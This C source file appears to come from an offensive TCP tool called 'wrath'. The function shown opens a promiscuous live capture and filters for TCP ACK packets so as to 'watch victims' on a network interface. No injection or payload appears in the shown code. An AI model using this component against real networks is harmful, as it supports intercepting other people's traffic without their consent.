#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include "wrath-structs.h"

#define ACK_PACKETS "tcp[tcpflags] & tcp-ack != 0"
#define ACK_PACKETS_EXT "tcp[tcpflags] & tcp-ack != 0 and %s"

// places wrath in the position to capture the victims packets
pcap_t *wrath_position(struct arg_values *cline_args) {
	struct pcap_pkthdr cap_header;
	const u_char *packet, *pkt_data;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	pcap_t *pcap_handle;
	
	if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
		device = pcap_lookupdev(errbuf);
		if(device == NULL) {
			fprintf(stderr, "error fetching interface: %s %s\n", errbuf, "(this program must be run as root)");
			exit(1);
		}
	} else { // if interface is set
		device = cline_args->interface;
	}

	printf("Watching victims on %s\n", device);	

	pcap_handle = pcap_open_live(device, 4026, 1, 0, errbuf); 
	if (pcap_handle == NULL)
		pcap_perror(pcap_handle, errbuf);
	
	// parse/compile bpf (if filter is null, skip this step)
	struct bpf_program fp;
		
	char *filter_str;
	filter_str  = (char * ) malloc(sizeof ACK_PACKETS_EXT + strlen(cline_args->filter));
	if (strcmp(cline_args->filter,"\0") != 0) { // if filter is set
		sprintf(filter_str, ACK_PACKETS_EXT, cline_args->filter);
	} else {
		sprintf(filter_str, ACK_PACKETS);
	}
	printf("Victim filter: %s\n", filter_str);

	if ((pcap_compile(pcap_handle, &fp, filter_str, 1, 0)) == -1) {
		pcap_perror(pcap_handle, "[ERROR] compiling filter");
		exit(1); 
	}
	if (pcap_setfilter(pcap_handle, &fp) == -1) {
		pcap_perror(pcap_handle, "[ERROR] setting filter");
		exit(1);
	}

	free(filter_str);
	return pcap_handle;
}
